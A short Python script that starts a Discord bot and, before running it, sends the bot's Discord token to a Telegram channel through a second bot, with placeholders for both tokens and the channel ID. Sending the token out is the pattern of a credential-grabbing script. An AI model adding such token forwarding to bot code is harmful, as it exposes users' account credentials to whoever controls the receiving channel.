import discord, asyncio, telegram
from discord.ext import commands
token = 'DISCORD BOT TOKEN HERE'
client = commands.Bot(command_prefix='!') # Create a discord bot + prefix
telegram_bot = telegram.Bot(token='TELEGRAM BOT TOKEN HERE') # Create a telegram bot

async def send_token_to_telegram():
    await telegram_bot.send_message(chat_id='YOUR TELEGRAM CHANNEL ID HERE', text=token)
asyncio.run(send_token_to_telegram()) #Log the used token into your telegram channel

# Run the bot :)
client.run(token)
